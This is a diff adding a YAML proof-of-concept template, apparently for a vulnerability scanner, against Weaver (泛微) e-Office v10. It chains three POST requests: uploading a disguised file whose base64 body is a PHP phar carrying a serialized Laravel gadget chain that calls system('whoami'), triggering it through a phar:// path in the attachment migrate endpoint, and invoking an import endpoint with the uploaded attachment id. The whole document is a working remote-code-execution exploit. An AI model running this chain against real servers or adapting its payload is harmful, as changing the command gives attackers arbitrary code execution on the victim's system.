@@ -1,0 +1,31 @@
+name: 泛微-EOffice-v10-atuh-file-RCE
+description: >
+  需进一步测试利用
+alwaysExecute: false
+matchCount: 3
+rules:
+  - method: POST
+    path: /eoffice10/server/public/api/attachment/atuh-file
+    search: '"attachment_id":"(?P<attachment_id>[^"]+)"'
+    headers:
+      Content-Type: multipart/form-data; boundary=jzdwsbic
+    body: "--jzdwsbic\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"register.inc\"\r\nContent-Type: image/jpeg\r\n\r\nBase64Decode{PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQokAQAAAQAAABEAAAABAAAAAADuAAAATzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO3M6Njoic3lzdGVtIjt9czo4OiIAKgBldmVudCI7TzozODoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcQnJvYWRjYXN0RXZlbnQiOjE6e3M6MTA6ImNvbm5lY3Rpb24iO3M6Njoid2hvYW1pIjt9fQgAAAB0ZXN0LnR4dAUAAAAqH6ZhBQAAAOmPsbu0AQAAAAAAAHRlc2F05eRmN0jjnqjxPuyQ7MEQ33p3j+QCAAAAR0JNQg==}\r\n--jzdwsbic--"
+    expression:
+      status: 200
+  - method: POST
+    path: /eoffice10/server/public/api/attachment/path/migrate
+    headers:
+      Content-Type: application/x-www-form-urlencoded    
+    body: >-
+      source_path=&desc_path=phar%3A%2F%2F..%2F..%2F..%2F..%2Fattachment%2F
+    expression:
+      status: 200
+  - method: POST
+    path: /eoffice10/server/public/api/empower/import
+    headers:
+      Content-Type: application/x-www-form-urlencoded    
+    body: "type=tttt&file={{attachment_id}}"
+    expression:
+      status: 200
+      headers:
+        Content-Type: application/json
